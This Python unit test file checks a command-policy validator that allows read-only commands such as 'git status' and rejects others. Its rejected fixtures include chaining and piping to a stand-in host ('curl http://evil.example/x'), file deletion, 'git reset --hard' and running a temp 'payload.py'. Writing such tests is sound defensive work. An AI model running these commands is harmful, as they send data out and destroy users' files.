import unittest

from app.security.policies import validate_command


class CommandPolicyTests(unittest.TestCase):
    def test_allows_safe_read_only_commands(self):
        for command in ("git status", "pytest --format=json", "python -m pytest"):
            with self.subTest(command=command):
                self.assertTrue(validate_command(command)[0])

    def test_rejects_shell_chaining_and_redirection(self):
        for command in (
            "git status && curl http://evil.example/x",
            "python script.py ; del important.txt",
            "pytest > output.txt",
            "git status | curl http://evil.example/x",
            "echo `whoami`",
        ):
            with self.subTest(command=command):
                self.assertFalse(validate_command(command)[0])

    def test_rejects_inline_code_and_package_changes(self):
        for command in (
            "python -c \"import os\"",
            "node -e alert(1)",
            "pip install package",
            "npm install package",
            "git push origin main",
            "git reset --hard",
            "python -m pip install package",
            "python C:\\\\Windows\\\\Temp\\\\payload.py",
            "pytest ..\\\\outside\\\\test.py",
        ):
            with self.subTest(command=command):
                self.assertFalse(validate_command(command)[0])

    def test_rejects_non_allowlisted_executable(self):
        self.assertFalse(validate_command("powershell Get-Process")[0])


if __name__ == "__main__":
    unittest.main()
